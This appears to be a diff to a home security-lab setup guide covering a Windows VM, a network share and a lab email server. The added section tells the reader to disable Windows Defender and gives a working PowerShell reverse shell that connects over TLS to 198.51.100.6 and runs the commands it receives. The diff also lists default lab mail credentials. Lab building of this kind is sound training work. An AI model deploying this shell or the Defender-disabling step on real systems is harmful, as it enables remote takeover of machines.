@@ -405,3 +405,34 @@ You will be prompted for credentials — use the user account you created earlie
 <div align="center">  
     <img alt="Windows network share" src="/resources/images/windows/nas-1.png" width="100%">  
 </div>  
+
+If you want to implement the C2 server described in [Carrie Robers PowerShell script](/resources/docs/vm-setup/setup-c2-server.md), disable Windows Defender and use script
+
+```bash
+$socket = New-Object Net.Sockets.TcpClient('198.51.100.6', 443)
+$stream = $socket.GetStream()
+$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
+$sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false)
+$writer = new-object System.IO.StreamWriter($sslStream)
+$writer.Write('PS ' + (pwd).Path + '> ')
+$writer.flush()
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+$sendback = (iex $data | Out-String ) 2>&1;
+$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
+```
+
+To access the lab email server (if you followed the tutorial), a DNS record is created in the FortiGate DNS Database.
+
+<div align="center">  
+    <img alt="Windows DNS" src="/resources/images/windows/dns-email.png" width="100%">  
+</div>
+
+On the Windows VM, open `https://email.lab.local` (or `https://203.0.113.6`) and log in with the credentials from the `.env` file (`MAIL_USER` / `MAIL_PASS`). You should see the test email that was sent by the Python script, including the attachment. Default credentials in the `.env` file are: `charlie.l@lab.local` / `supersecret123`.
+
+<div align="center">  
+    <img alt="Windows Email" src="/resources/images/windows/email.png" width="100%">  
+</div>
